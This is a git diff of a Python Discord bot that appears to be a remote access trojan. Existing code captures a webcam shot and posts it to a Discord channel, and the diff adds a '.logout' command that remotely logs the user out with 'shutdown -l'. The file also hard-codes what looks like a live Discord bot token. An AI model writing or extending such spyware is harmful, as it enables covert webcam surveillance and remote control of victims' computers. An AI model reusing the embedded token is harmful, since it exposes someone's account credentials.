@@ -133,5 +133,12 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Webcamshot", description="Webcamshot taken.", color=0x00ff00)
         await message.channel.send(embed=embed,file=discord.File(wc))
+
+    #LOGOUT
+    if message.content.startswith(".logout"):
+        await message.delete()
+        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
+        await message.channel.send(embed=embed)
+        os.system("shutdown -l")
 client.run("MTE2OTU4MDgwOTQxNDUyOTA2NQ.G-rRef.fnbeuU_NqaBHxyb2Qsr4P1NLilaH9LMkD72mEw")
 
